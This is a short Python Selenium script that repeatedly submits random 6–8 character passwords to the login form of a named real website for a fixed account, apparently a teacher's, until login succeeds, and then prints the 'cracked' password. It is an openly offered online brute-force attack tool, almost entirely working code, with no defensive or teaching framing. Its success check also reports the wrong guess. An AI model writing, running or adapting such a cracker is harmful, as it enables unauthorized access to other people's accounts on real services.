from selenium.webdriver import Chrome
from selenium.webdriver import ChromeOptions
import random

driver_path = '/Users/admin/Desktop/chromedriver'
options = ChromeOptions()
options.headless = False

driver = Chrome(executable_path=driver_path, options=options)

url = 'https://www.mci4me.at/de/login'

chars_lower = 'abcdefghijklmnopqrstuvwxyz1234567890'
chars_upper_and_lower = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'

chars = chars_upper_and_lower # If you want only lower cases change this variable to 'chars_lower'

charst_list = list(chars)

driver.get(url)
cookies = driver.find_element_by_xpath('//*[@id="cookiehintsubmitno"]').click()

get_url = driver.current_url
logout_status = True
if get_url == 'https://www.mci4me.at/de/':
    logout_status = False

teacher_name = 'test@test.com'
guess_password = ''
while logout_status:
    password_leight = random.randint(6, 8)
    get_url = driver.current_url
    if get_url == 'https://www.mci4me.at/de/':
        logout_status = False
        print(f'Cracked password is {guess_password}')
    guess_password = random.choices(charst_list, k=password_leight)
    username = driver.find_element_by_xpath('//*[@id="username"]')
    username.send_keys(teacher_name)
    password = driver.find_element_by_xpath('//*[@id="password"]')
    password.send_keys(guess_password)
    submit = driver.find_element_by_xpath('/html/body/form/button').click()
    print(guess_password)
    

